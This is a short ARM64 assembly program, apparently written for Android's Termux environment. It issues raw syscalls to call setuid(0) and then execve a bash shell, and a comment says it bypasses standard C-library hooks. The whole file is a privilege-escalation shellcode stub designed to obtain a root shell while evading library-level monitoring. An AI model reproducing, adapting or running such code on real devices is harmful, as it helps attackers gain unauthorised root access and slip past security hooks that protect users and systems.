.section .text
.global _start
_start:
    // Direct Syscall 146 (setuid) - Bypassing standard C-library hooks
    mov x8, #146
    mov x0, #0
    svc #0

    // Direct Syscall 221 (execve) 
    mov x8, #221
    adrp x0, .Lshell
    add x0, x0, :lo12:.Lshell
    mov x1, #0
    mov x2, #0
    svc #0
.section .data
.Lshell: .asciz "/data/data/com.termux/files/usr/bin/bash"
